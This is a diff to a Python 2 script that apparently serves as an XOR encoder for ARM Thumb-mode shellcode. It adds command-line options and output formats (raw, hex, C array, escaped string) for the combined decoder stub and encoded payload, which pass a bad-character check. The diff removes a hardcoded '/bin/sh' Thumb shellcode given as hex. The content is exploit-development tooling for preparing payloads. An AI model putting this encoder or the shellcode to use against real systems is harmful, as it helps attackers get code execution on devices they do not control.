@@ -2,6 +2,7 @@
 import os
 import sys
 import tempfile
+from optparse import OptionParser
 
 # Assembler 
 BIN_AS = '/usr/bin/arm-linux-gnueabi-as'
@@ -15,8 +16,33 @@ ALTER_BIN_OC = 'objcopy'
 # RAW Shellcode
 RAW_SC = 'raw_sc'
 
+g_arch = 'thumb'
+g_string = 'hex'
+g_format = ''
+g_verbose = False
+
+def _string(s):
+    out = []
+    for c in s:
+        co = ord(c)
+        out.append('\\x%02x' % co)
+    return '"' + ''.join(out) + '"\n'
+
+def _carray(s):
+    out = []
+    for c in s:
+        out.append('0x' + enhex(c))
+    return '{' + ', '.join(out) + '};\n'
+
+def enhex(c):
+    return c.encode('hex')
+
+def unhex(c):
+    return c.decode('hex')
+
 def SYSERR(m):
-    print >> sys.stderr, "%s" % (m)
+    if g_verbose:
+        print >> sys.stderr, "%s" % (m)
 
 def cleanup(fn):
     for f in fn:
@@ -188,10 +214,50 @@ def checkBadChar(sc, bc=[0x00, 0x0a]):
     return bcs
 
 if __name__ == '__main__':
-    # for testing
-    # /bin/sh in thumb mode
-    SC = "02a000220b2705b4694601df2f62696e2f7368000000".decode('hex')
-    #SC = sys.stdin.read()
+    parser = OptionParser(description = 'XOREncoder for Thumb mode shellcode by alex.park')
+    parser.add_option('-a', '--architechture',
+                   dest='arch',
+                   type = str,
+                   help = 'options: so far, thumb only') 
+
+    parser.add_option('-f', '--format',
+                   dest = 'format',
+                   type = 'choice',
+                   choices = ['r', 'raw',
+                              's', 'str', 'string',
+                              'h', 'hex',
+                              'c'
+                             ],
+                   help = '{r}aw, {s}tring, {h}ex, {c} for C code if encoded'
+                   )
+
+    parser.add_option('-v', '--verbose',
+                   dest = 'verbose',
+                   action="store_true", 
+                   default=False,
+                   help = 'verbose mode')
+
+    (opt, args) = parser.parse_args()
+
+    if opt.arch:
+        g_arch = opt.arch
+
+    if opt.format:
+        if opt.format in ['r', 'raw']:
+            g_format = 'raw'
+        elif opt.format in ['s', 'str', 'string']:
+            g_format = 'string'
+        elif opt.format == 'c':
+            g_format = 'c'
+        elif opt.format in ['h', 'hex']:
+            g_format = 'hex'
+        else:
+            g_format = 'string'
+
+    if opt.verbose:
+        g_verbose = True
+
+    SC = sys.stdin.read()
 
     prepareCompiler()
 
@@ -202,14 +268,23 @@ if __name__ == '__main__':
     XORSC = encodeShellcode(SC, key)
     # build a decoder
     XORER = MakeXOR(len(XORSC), key)
+    FINALSC = ''
     rv = checkBadChar(XORER+XORSC)
     if len(rv) != 0:
         SYSERR("!!! Bad char has been found in shellcode. Please check out")  
     else:
+        FINALSC = XORER + XORSC
         SYSERR( "Shellcode: size - %d" % (len(XORSC)) )
         SYSERR( "Decoder  : size - %d" % (len(XORER)) )
-        if os.path.exists(RAW_SC) == True:
-            os.unlink(RAW_SC)
-        open(RAW_SC, 'wb').write(XORER + XORSC)
+        SYSERR( "Total    : size - %d" % (len(FINALSC)) )
 
-    print XORSC #.encode('hex')
+    if g_format == 'c':
+        print _carray(FINALSC)
+    elif g_format == 'string':
+        print _string(FINALSC)
+    elif g_format == 'raw':
+        print FINALSC
+    elif g_format == 'hex':
+        print enhex(FINALSC)
+    else:
+        print _string(FINALSC)
